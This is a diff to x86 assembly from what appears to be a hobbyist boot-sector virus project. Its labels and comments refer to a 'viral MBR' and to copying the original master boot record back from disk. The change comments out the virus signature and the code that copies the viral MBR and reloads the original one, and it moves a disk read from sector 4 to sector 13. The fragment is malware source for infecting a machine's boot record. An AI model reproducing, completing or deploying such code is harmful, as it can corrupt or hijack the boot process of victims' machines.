@@ -78,7 +78,7 @@ crypt:
 	
 load_vx_paint:
 ;	signature:
-	db 0x78,0x6f,0x78,0x6f
+;	db 0x78,0x6f,0x78,0x6f
 	mov ax, 0x0		;reset disk
 	int 13h
 
@@ -100,7 +100,7 @@ load_vx_paint:
 	read_sector:
 		mov ax, 0x215	;read twenty one sectors of disk
 		mov ch, 0
-		mov cl, 4		;cylinder 0, sector 4 
+		mov cl, 0xD		;cylinder 0, sector 13 
 		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
 ;		mov dl, [DefaultDisk]
 		mov bx, 0x200
@@ -116,49 +116,49 @@ load_vx_paint:
 		dec cx
 		cmp cx, 0
 		jnz copy_sector_loop
-	cmp byte [copy_replay], 0x0
-	jz idontplaytagb
-	cmp byte [copy_replay], 0x1
-	jz load_OG_mbr
+	;cmp byte [copy_replay], 0x0
+	;jz idontplaytagb
+	;cmp byte [copy_replay], 0x1
+	;jz load_OG_mbr
 	jmp idontplaytagb
 
-copy_vx_MBR:	
-;	xchg bx, bx
-	push cs						;copy the code here (the viral MBR) 
-	pop es						;to address 0000:0x600
-	mov di, 0x600				;this is typical MBR behavior
-	mov bx, VX_BOOT ;ax=VXBOOT
-;	;xor si, si
-	mov byte [copy_replay], 0x1
-;	xchg bx, bx
-	mov cx, 0x100
-	jmp copy_sector_loop	
-
-	;copy original MBR to this address 0000:0x7c00
-	;
-
-load_OG_mbr:
-	mov ax, 0x201	;read one sectors of disk
-	mov ch, 0		;retrieve OG MBR
-	mov cl, 3		;cylinder 0, sector 3 
-	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
-	mov bx, 0x200
-	int 13h
-	
-
-copy_OG_MBR:
-	;mov ax, 0x07c0
-	;mov es, ax
-	;mov ds, ax
-	push cs
-	pop es
-	mov di, 0x7C00				;this is typical MBR behavior
-	;mov di, 0x7E00				;this is typical MBR behavior
-	mov bx, 0x200
-	xor di, di
-	mov byte [copy_replay], 0x0
-	mov cx, 0x100
-	jmp copy_sector_loop	
+;copy_vx_MBR:	
+;;	xchg bx, bx
+;	push cs						;copy the code here (the viral MBR) 
+;	pop es						;to address 0000:0x600
+;	mov di, 0x600				;this is typical MBR behavior
+;	mov bx, VX_BOOT ;ax=VXBOOT
+;;	;xor si, si
+;	mov byte [copy_replay], 0x1
+;;	xchg bx, bx
+;	mov cx, 0x100
+;	jmp copy_sector_loop	
+;
+;	;copy original MBR to this address 0000:0x7c00
+;	;
+;
+;load_OG_mbr:
+;	mov ax, 0x201	;read one sectors of disk
+;	mov ch, 0		;retrieve OG MBR
+;	mov cl, 3		;cylinder 0, sector 3 
+;	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
+;	mov bx, 0x200
+;	int 13h
+;	
+;
+;copy_OG_MBR:
+;	;mov ax, 0x07c0
+;	;mov es, ax
+;	;mov ds, ax
+;	push cs
+;	pop es
+;	mov di, 0x7C00				;this is typical MBR behavior
+;	;mov di, 0x7E00				;this is typical MBR behavior
+;	mov bx, 0x200
+;	xor di, di
+;	mov byte [copy_replay], 0x0
+;	mov cx, 0x100
+;	jmp copy_sector_loop	
 
 idontplaytagb:	
 	jmp boot2nd:0
